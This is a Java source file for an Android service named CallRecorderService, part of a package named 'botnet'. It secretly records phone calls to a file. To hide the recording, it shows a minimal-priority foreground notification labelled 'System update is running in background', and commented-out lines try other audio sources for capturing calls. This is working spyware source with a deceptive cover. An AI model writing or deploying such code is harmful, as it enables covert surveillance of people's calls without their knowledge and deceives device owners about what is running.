package com.example.kico.botnet;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;

import com.example.kico.botnet.utils.Constants;

//import android.util.Log;

public class CallRecorderService extends Service {

    MediaRecorder recorder;
    static final String TAGS = "botnet";

    private boolean isStartRecordSuccess = true;
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public int onStartCommand(Intent intent, int flags, int startId) {
        String NOTIFICATION_CHANNEL_ID = "com.example.simpleapp";
        String channelName = "My Background Service";
        NotificationChannel chan = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            chan.setLightColor(Color.BLUE);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        }
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            manager.createNotificationChannel(chan);
        }

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("System update is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
        recorder = new MediaRecorder();
        recorder.reset();

        String phoneNumber = intent.getStringExtra(Constants.Prefs.PHONE_CALL_NUMBER);
        String outputPath = intent.getStringExtra(Constants.Prefs.CALL_RECORD_PATH);
        //Log.d(TAGS, "Phone number in service: " + phoneNumber);

//            if (android.os.Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
//                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
//            } else if (android.os.Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
//                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
//            } else {
//                recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
//            }

        recorder.setAudioSamplingRate(44100);
        recorder.setAudioEncodingBitRate(96000);


        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION);
//        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

//        recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
//        recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
//        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);


//        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
//        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
//        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);


//        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
//        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
//        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

        recorder.setOutputFile(outputPath);

        try {
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            isStartRecordSuccess = false;
            e.printStackTrace();
        }
        return START_NOT_STICKY;
    }

    public void onDestroy() {
        super.onDestroy();
        if (isStartRecordSuccess) {
            try {
                if (recorder != null) {
                    recorder.stop();
                    recorder.reset();
                    recorder.release();
                    recorder = null;
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            //Log.d(TAGS, "onDestroy: " + "Recording stopped");
        }
    }
}
